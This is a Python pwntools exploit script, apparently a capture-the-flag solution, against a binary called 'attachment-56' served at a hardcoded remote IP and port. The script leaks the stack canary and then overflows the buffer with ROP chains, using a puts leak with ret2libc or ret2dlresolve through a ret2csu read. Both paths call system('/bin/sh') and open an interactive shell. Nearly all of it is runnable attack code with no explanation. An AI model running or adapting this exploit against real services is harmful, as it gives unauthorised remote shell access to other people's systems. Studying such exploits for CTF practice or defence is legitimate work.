#!/usr/bin/env python3
from pathlib import Path

from pwn import *


context.binary = elf = ELF("./attachment-56", checksec=False)
context.arch = "amd64"

OFFSET = 24
MARKER = b"A" * 25
POP_RDI = 0x401763
RET = 0x40101A
CSU_CALL = 0x401740
CSU_POP = 0x40175A
PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]
READ_GOT = elf.got["read"]
MAIN = elf.sym["main"]
PLT0 = elf.get_section_by_name(".plt").header.sh_addr
DEFAULT_HOST = "39.96.193.120"
DEFAULT_PORT = 10001


def parse_canary(data: bytes) -> int:
    pos = data.rfind(MARKER)
    if pos < 0 or len(data) < pos + len(MARKER) + 7:
        raise ValueError(f"failed to parse canary from: {data[-200:]!r}")
    return u64(b"\x00" + data[pos + len(MARKER):pos + len(MARKER) + 7])


def find_libc(io, libc_arg: str | None):
    libs = io.libs()

    if libc_arg:
        want = str(Path(libc_arg).resolve())
        if want in libs:
            return ELF(want, checksec=False), libs[want]

        for path, base in libs.items():
            if Path(path).name == Path(want).name:
                return ELF(path, checksec=False), base

        raise RuntimeError(f"target libc not mapped: {want}")

    for path, base in libs.items():
        name = Path(path).name
        if "libc.so.6" in name or name.startswith("libc-"):
            return ELF(path, checksec=False), base

    raise RuntimeError("failed to locate mapped libc")


def start():
    if args.REMOTE:
        host = args.HOST or DEFAULT_HOST
        port = int(args.PORT or DEFAULT_PORT)
        return remote(host, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript="continue")
    return process([elf.path])


def csu_call(func_ptr: int, arg1: int, arg2: int, arg3: int, next_addr: int) -> bytes:
    return flat(
        p64(CSU_POP),
        p64(0),
        p64(1),
        p64(arg1),
        p64(arg2),
        p64(arg3),
        p64(func_ptr),
        p64(CSU_CALL),
        p64(0),
        p64(0),
        p64(0),
        p64(0),
        p64(0),
        p64(0),
        p64(0),
        p64(next_addr),
    )


def solve():
    io = start()

    io.sendlineafter(b"wizard's note:", b"100")
    io.sendlineafter(b"rune sheet!", b"magic")
    io.recvuntil(b"What do you sacrifice?\n")

    io.send(MARKER)
    leak = io.recvuntil(b"curious gift indeed.\n")
    canary = parse_canary(leak)
    log.success(f"canary = {canary:#x}")

    if args.REMOTE:
        if args.LIBC:
            payload = flat(
                b"B" * OFFSET,
                p64(canary),
                b"C" * 8,
                p64(POP_RDI),
                p64(PUTS_GOT),
                p64(PUTS_PLT),
                p64(MAIN),
            )
            io.send(payload)

            io.recvuntil(b"The ghost answers with warmth.\n")
            puts_addr = u64(io.recvline().strip().ljust(8, b"\x00"))
            libc = ELF(args.LIBC, checksec=False)
            libc_base = puts_addr - libc.sym["puts"]
            system = libc_base + libc.sym["system"]
            binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
            log.success(f"libc = {libc.path}")
            log.success(f"puts = {puts_addr:#x}")
            log.success(f"libc_base = {libc_base:#x}")
            log.success(f"system = {system:#x}")
            log.success(f"binsh = {binsh:#x}")

            io.send(b"\x00")
            io.recvuntil(b"curious gift indeed.\n")

            payload = flat(
                b"D" * OFFSET,
                p64(canary),
                b"E" * 8,
                p64(RET),
                p64(POP_RDI),
                p64(binsh),
                p64(system),
            )
            io.send(payload)
        else:
            context.cache_dir = None
            dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
            rop = ROP(elf)
            rop.ret2dlresolve(dlresolve)
            dl_chain = rop.chain()
            read_chain = csu_call(
                READ_GOT,
                0,
                dlresolve.data_addr,
                len(dlresolve.payload),
                u64(dl_chain[:8]),
            )
            payload = flat(
                b"B" * OFFSET,
                p64(canary),
                b"C" * 8,
                read_chain,
                dl_chain[8:],
            )
            log.success(f"ret2dlresolve data_addr = {dlresolve.data_addr:#x}")
            log.success(f"ret2dlresolve reloc_index = {dlresolve.reloc_index:#x}")
            log.success(f"ret2dlresolve payload_len = {len(dlresolve.payload):#x}")
            io.send(payload)
            io.send(dlresolve.payload)
    else:
        libc, libc_base = find_libc(io, args.LIBC if args.LIBC else None)
        system = libc_base + libc.sym["system"]
        binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
        log.success(f"libc = {libc.path}")
        log.success(f"libc_base = {libc_base:#x}")
        log.success(f"system = {system:#x}")
        log.success(f"binsh = {binsh:#x}")

        payload = flat(
            b"B" * OFFSET,
            p64(canary),
            b"C" * 8,
            p64(RET),
            p64(POP_RDI),
            p64(binsh),
            p64(system),
        )
        io.send(payload)

    io.interactive()


if __name__ == "__main__":
    solve()
